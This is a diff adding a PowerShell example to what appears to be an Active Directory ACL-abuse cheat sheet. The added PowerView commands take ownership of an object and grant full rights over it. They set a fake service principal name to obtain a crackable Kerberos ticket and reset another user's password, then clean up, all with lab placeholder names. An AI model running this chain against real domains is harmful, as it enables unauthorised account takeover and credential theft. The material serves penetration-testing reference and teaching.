@@ -43,6 +43,21 @@ Become the owner of an object → modify DACL to give themselves GenericAll.
     export KRB5CCNAME=user2.ccache
     getnthash.py -key <minikerberos key from gettgtokinit.py> domail.local/target_user
     ```
+#### Using PowerShell
+   ```powershell
+   $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+   $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+   Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y
+   Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All
+   Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+   Get-DomainSPNTicket -Credential $Cred harmj0y | fl
+   $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+   Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred
+
+   #cleanup
+   Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
+   Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All
+   ```
 ---
 ## **WriteDACL**
 ### Description: Permission to modify the DACL itself.
